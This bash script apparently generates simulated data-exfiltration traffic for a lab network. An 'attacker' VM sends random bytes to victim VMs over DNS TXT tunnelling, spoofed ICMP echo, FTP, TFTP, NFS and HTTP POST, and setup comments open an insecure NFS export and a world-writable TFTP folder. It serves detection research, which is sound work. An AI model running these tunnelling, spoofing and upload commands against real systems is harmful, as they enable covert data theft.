#!/usr/bin/env bash
#
# infiltracion_vm3_random.sh – Data Infiltration Traffic Generator
#
# • Duration: 600 s (10.0 min)
# • Random techniques:
#     - dns_tunnel     (DNS TXT queries with hex data)
#     - icmp_tunnel    (ICMP echo with binary payload)
#     - ftp_upload     (massive FTP upload)
#     - tftp_upload    (massive TFTP upload)
#     - nfs_copy       (copy file to NFS share)
#     - http_upload    (HTTP POST with binary body)
# • Tools (VM3, attacker):
#     sudo apt update
#     sudo apt install -y dnsutils hping3 curl ftp tftp-hpa nfs-common netcat-openbsd openssl xxd
#
# ▶ PREPARE VM1/VM2 (victims receiving data):
#   sudo apt update
#   sudo apt install -y vsftpd tftpd-hpa nfs-kernel-server netcat-openbsd apache2
#
#   # FTP: vsftpd listens on 21 (default in /srv/ftp)
#   # TFTP: folder /var/lib/tftpboot with 777 permissions
#   sudo mkdir -p /var/lib/tftpboot
#   sudo chown nobody:nogroup /var/lib/tftpboot
#   sudo systemctl restart tftpd-hpa
#
#   # NFS: export /export
#   sudo mkdir -p /export
#   echo "/export *(rw,no_root_squash,no_subtree_check)" | sudo tee /etc/exports
#   sudo exportfs -a
#   sudo systemctl restart nfs-kernel-server
#
#   # HTTP: Netcat reception point on 9092
#   nohup nc -lkvp 9092 > ~/exf_recv.bin 2>&1 &
#
# ▶ CAPTURE on VM1/VM2 (before launching attacker):
# sudo tcpdump -U -i enp0s3 -s0 -w - \
#   "(port 53 or icmp or port 21 or port 69 or port 2049 or port 80) \
#     and net 192.168.56.0/24 and not host 192.168.56.107 and not port 9999" \
#   | nc -q 0 192.168.56.107 9999
#
# USAGE (VM3, attacker):
#   sudo ./infiltracion_vm3_random.sh
#

# 1) Root check
if [[ $EUID -ne 0 ]]; then
  echo "Run with sudo to create IP alias and send raw packets" >&2
  exit 1
fi

# 2) Dependencies
missing=()
for cmd in dig hping3 curl ftp tftp mount xxd; do
  command -v "$cmd" &>/dev/null || missing+=($cmd)
done
# netcat for HTTP receive (not strictly on attacker)
command -v nc &>/dev/null || missing+=(nc)

if (( ${#missing[@]} )); then
  echo "ERROR: missing tools: ${missing[*]}" >&2
  echo "Install on VM3:" >&2
  echo "  sudo apt update && sudo apt install -y dnsutils hping3 curl ftp tftp-hpa nfs-common netcat-openbsd openssl xxd" >&2
  exit 1
fi

# 3) General parameters
duration=600
end_time=$(( SECONDS + duration ))
targets=(192.168.56.101 192.168.56.102)
srcs=(192.168.56.{240..254})
iface=$(ip route | awk '/^default/ {print $5; exit}')
iface=${iface:-enp0s3}

# 4) Create IP alias for spoofing
for ip in "${srcs[@]}"; do
  ip addr add "$ip"/24 dev "$iface" 2>/dev/null || :
done

# 5) Local NFS mount (mount point)
MOUNT_DIR="/mnt/exf_nfs"
mkdir -p "$MOUNT_DIR"

# 6) Available techniques
techs=(dns_tunnel icmp_tunnel ftp_upload tftp_upload nfs_copy http_upload)

echo "=== VM3: Random Infiltration (${duration}s) on $iface ==="

# 7) Main loop
while (( SECONDS < end_time )); do
  tech=${techs[RANDOM % ${#techs[@]}]}
  tgt=${targets[RANDOM % ${#targets[@]}]}
  src=${srcs[RANDOM % ${#srcs[@]}]}
  ts=$(date +%T)
  printf '[%s] %s → %s (src %s)\n' "$ts" "$tech" "$tgt" "$src"

  # Generate temporary binary payload
  LEN=$((512 + RANDOM % 1537))  # [512..2048] bytes
  TMP="/tmp/exf_${tech}_${RANDOM}_${SECONDS}.bin"
  head -c $LEN /dev/urandom > "$TMP"

  case "$tech" in

    dns_tunnel)
      # each TXT query carries small hex chunks
      HEX=$(xxd -p "$TMP" | fold -w 32 | head -n1)
      # sending a TXT query to subdomain
      dig @"$tgt" TXT "${HEX}.exf.example.com" +time=1 +tries=1 &>/dev/null
      ;;

    icmp_tunnel)
      # ICMP echo with binary payload
      hping3 -1 -c1 --spoof "$src" -E "$TMP" -I "$iface" "$tgt" &>/dev/null
      ;;

    ftp_upload)
      # FTP upload to anonymous directory (/srv/ftp/)
      # connects with anonymous user
      curl -s --interface "$src" -T "$TMP" "ftp://$tgt/" &>/dev/null
      ;;

    tftp_upload)
      # TFTP put to server
      echo "put $TMP" | tftp -p -l "$TMP" -r "$(basename $TMP)" "$tgt" &>/dev/null
      ;;

    nfs_copy)
      # mount, copy, unmount
      mount -o nolock "${tgt}:/export" "$MOUNT_DIR" 2>/dev/null || true
      cp "$TMP" "$MOUNT_DIR"/ &>/dev/null
      umount "$MOUNT_DIR" 2>/dev/null || true
      ;;

    http_upload)
      # Simple HTTP POST to netcat listener on 9092
      curl -s --interface "$src" \
           -X POST --data-binary @"$TMP" \
           "http://$tgt:9092/" --max-time 3 &>/dev/null
      ;;

  esac

  # cleanup
  rm -f "$TMP"

  # 8) Concurrency control (max 6 background processes)
  while (( $(jobs -r | wc -l) > 6 )); do sleep 0.2; done

  # 9) Random pause (0.1–0.5 s)
  pause=$(LC_NUMERIC=C awk -v min=0.1 -v max=0.5 \
    'BEGIN{srand(); printf "%.2f", min+rand()*(max-min)}')
  sleep "$pause"
done

# 10) Wait for background jobs completion
echo "Waiting for processes to finish..."
wait

echo "=== Infiltration finished ==="
